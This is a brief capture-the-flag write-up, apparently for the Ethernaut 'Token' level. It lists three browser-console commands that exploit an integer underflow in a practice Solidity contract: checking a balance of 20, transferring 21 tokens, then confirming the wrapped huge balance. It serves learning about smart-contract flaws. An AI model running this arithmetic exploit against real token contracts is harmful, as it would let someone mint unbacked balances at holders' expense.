# Console Execution for Level 6: Token

## Overview
For this level, we exploited an integer overflow vulnerability in the `Token` contract without needing a separate attack contract. All steps were performed directly in the console using the `Token` contract’s `transfer` function. This document details each step taken in the console to successfully complete the level.

## Console Execution Steps

1. **Check Initial Balance**  
   We first verified the initial balance provided in the contract:
   await contract.balanceOf(player).then(console.log); // Expected output: 20 tokens

2. Execute Overflow Attack
   By calling the transfer function with a value greater than the current balance (21 tokens), we triggered an overflow, causing the balance to wrap to a very large positive value:
   await contract.transfer("Yor_MM_Adres", 21);

3. Verify New Balance
   After executing the transfer, we verified the new balance to ensure the exploit was successful:
   await contract.balanceOf(player).then(console.log); // Expected output: Large positive balance
